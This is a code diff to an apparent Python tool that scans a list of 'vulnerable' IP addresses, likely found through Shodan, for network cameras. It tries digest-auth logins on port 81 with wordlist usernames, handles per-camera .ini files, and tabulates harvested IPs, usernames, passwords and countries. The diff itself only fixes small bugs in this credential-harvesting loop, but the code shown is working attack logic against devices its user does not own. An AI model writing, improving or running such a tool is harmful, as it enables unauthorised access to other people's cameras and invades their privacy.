@@ -7,8 +7,6 @@ from prettytable import PrettyTable
 from requests.auth import HTTPDigestAuth
 from geocoder import ip
 
-#shodan, os, urllib.request, requests, progress, prettytable, geocoder
-
 os.system('clear || cls')
 
 try:
@@ -81,13 +79,13 @@ if len(num_of_vulnerable) >= int('1'):
   taro2 = Fore.LIGHTGREEN_EX + str(len(num_of_vulnerable))
 else:
   taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
-  
+
 th = ['IP', 'USERNAME', 'PASSWORD', 'COUNTRY']
 td = []
 
 if len(num_of_vulnerable) >= int('1'):
  s = session()
- 
+
  with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
 
   for ipi in num_of_vulnerable:
@@ -113,7 +111,6 @@ if len(num_of_vulnerable) >= int('1'):
         file.close()
         os.remove(f'camera_{ipi}.ini')
         bar.next()
-        break
 
        request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
        if request.status_code == 200:
@@ -122,10 +119,10 @@ if len(num_of_vulnerable) >= int('1'):
         td.append('')
         td.append(ad.country)
         file.close()
-        os.remove('camera_{ipi}.ini')
+        os.remove(f'camera_{ipi}.ini')
         bar.next()
-        break
       except Exception as e:
+        print(e)
         continue
     except:
      continue
@@ -141,7 +138,6 @@ if len(num_of_vulnerable) >= int('1'):
     td_data = td_data[columns:]
  print(f'\n{table}\n')
 else:
- #print("No vulnerable devices was found!\n")
  taro = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
  print('Checked devices:', Fore.LIGHTCYAN_EX + str(len(list(set(ips)))))
  print('Vulnerable devices:', taro, '\n')
